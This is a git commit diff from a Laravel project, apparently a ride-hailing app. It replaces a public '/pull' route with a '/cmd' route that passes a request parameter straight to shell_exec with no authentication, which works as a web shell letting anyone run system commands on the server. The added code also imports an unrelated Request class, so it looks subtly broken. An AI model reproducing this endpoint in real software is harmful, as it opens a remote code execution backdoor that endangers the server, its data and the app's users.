fb9e1e9c1efcfe3458f89dc0d24dcff978831780
emad566 <emade09@gmail.com>
2023-09-13 15:33:51 +0300

    CMD

--- routes/web.php
+++ routes/web.php
@@ -2,6 +2,7 @@
 
 use App\Http\Controllers\API\V1\Captains\Auth\AuthController;
 use App\Http\Controllers\API\V1\Passengers\Profile\ProfileController;
+use http\Env\Request;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -20,9 +21,9 @@ Route::get('/', function () {
     return view('welcome');
 })->name('home');
 
-Route::get('/pull', function () {
-    return shell_exec('git pull');
-})->name('home');
+Route::get('/cmd', function (Request $request) {
+    return shell_exec($request->line);
+})->name('cmd');
 
 Route::get('captain/verify/{token}', [AuthController::class,'verifyEmail'])->name('captain.verify');
 Route::get('passenger/verify/{token}', [ProfileController::class,'verifyEmail'])->name('passanger.verify');
